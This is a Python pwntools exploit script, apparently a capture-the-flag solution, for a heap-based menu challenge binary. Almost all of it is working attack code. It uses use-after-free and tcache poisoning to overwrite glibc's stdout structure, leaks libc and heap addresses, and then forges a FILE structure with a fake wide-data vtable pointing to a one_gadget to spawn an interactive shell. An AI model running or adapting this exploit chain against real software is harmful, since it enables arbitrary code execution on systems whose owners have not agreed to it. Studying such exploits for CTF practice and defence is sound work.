#!/usr/bin/env python3

from pwn import *
exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
# context.terminal = ["tmux", "splitw", "-h"]
context.terminal = ["foot", "-e", "sh", "-c"]
# context.terminal = ["kitty", "sh", "-c"]
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())


# above: 0x555555558010
# pet : 0x555555558060
# name size: 0x555555558160
# stdout: 0xb780

def buy(num):
    sna(b'> ', 1)
    sna(b'much? ', num)

def edit(idx, data):
    sna(b'> ', 2)
    sna(b'Index: ', idx)
    sa(b'Name: ', data)

def refund(idx):
    sna(b'> ', 3)
    sna(b'Index: ', idx)


###########
# exploit #
###########

def script():
    
    buy(236)
    buy(2000)
    buy(236)
    buy(236)
    buy(236)

    # uaf tcache
    # refund - prepare for tcache poison 3 times

    refund(3)
    refund(0)
    refund(2)

    buy(236)

    refund(2)

    # get libc in heap

    refund(1)
    buy(2000)

    edit(0, p16(0xb3a0)) 
    edit(1, p16(0x76c8))

    buy(236)
    buy(236)

    # overwrite stdout and leak libc
    buy(236)

    edit(5, p8(0xff))

    p.recv(29)

    libc_leak = u64(p.recv(6) + b'\0\0')
    libc.address = libc_leak - 0x1ec880
    stdout = libc.sym._IO_2_1_stdout_
    main_arena = stdout - 0xac0

    info("libc leak: " + hex(libc_leak))
    info("libc base: " + hex(libc.address))

    # main arena = stdout - 0xac0

    buy(236)

    refund(4)
    refund(6)
    refund(2)

    edit(0, p16(0xb3a0))
    edit(1, p16(0x76a0))

    buy(236)
    buy(236)
    buy(236)

    # 5 is write ptr
    # 6 is stdout 

    load = flat(
        0xfbad2887,
        0, 
        main_arena, # read end
        0,
        main_arena, # write base
    )

    edit(6, load)

    heap_leak = u64(p.recv(6) + b'\0\0')
    heap_base = heap_leak - 0xf70
    fake_vtable = heap_base +0x3a0
    info("heap leak: " + hex(heap_leak))
    info("heap base: " + hex(heap_base))
    info("vtable fake: " + hex(fake_vtable))

    # fake vtable

    pop_rdi = 0x23b6a + libc.address
    one_gadget = 0xe3b01 + libc.address

    load = flat(
        b'\0'.ljust(0x68, b'\0'),
        one_gadget
    )
    load = load.ljust(0xe0, b'\0')
    load += p64(fake_vtable)

    edit(1,load)

    vtable_IO_wfile_overflow = 24 + libc.sym._IO_wfile_jumps_maybe_mmap - 0x38
    default = libc.sym._IO_2_1_stdout_ + 131

    """
    index 6 is now the begining of stdout file struct
    index 1 is wdata
    """
    lock = heap_base + 0xc50

    fp = FileStructure()

    # fp.flags = 0x00000000fbad2887
 
    fp._wide_data = fake_vtable
    fp._lock = libc.sym._IO_stdfile_1_lock
    fp.vtable = vtable_IO_wfile_overflow

    # print(fp)

    # input()

    edit(6, bytes(fp))

count = 0

while (count < 1):
# while(1):
    count+=1

    info(f'attemp {count}: ')

    try:
        if args.REMOTE:
            p = remote('0', 1337)
        else:
            p = process([exe.path])

        def GDB():
            if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                #b*0x55555555538c
                # b*puts
                c
                ''')
                sleep(1)
        GDB()

        script()

    
        # sl(b'cat flag')
        # sl(b'cat flag.txt')
        # out = p.recv(timeout=5)
        # if b'{' in out:
        #     p.interactive()
        #     break
        # else:
        #     p.close()
        #     continue
    except EOFError:
        p.close()
        continue


p.interactive()
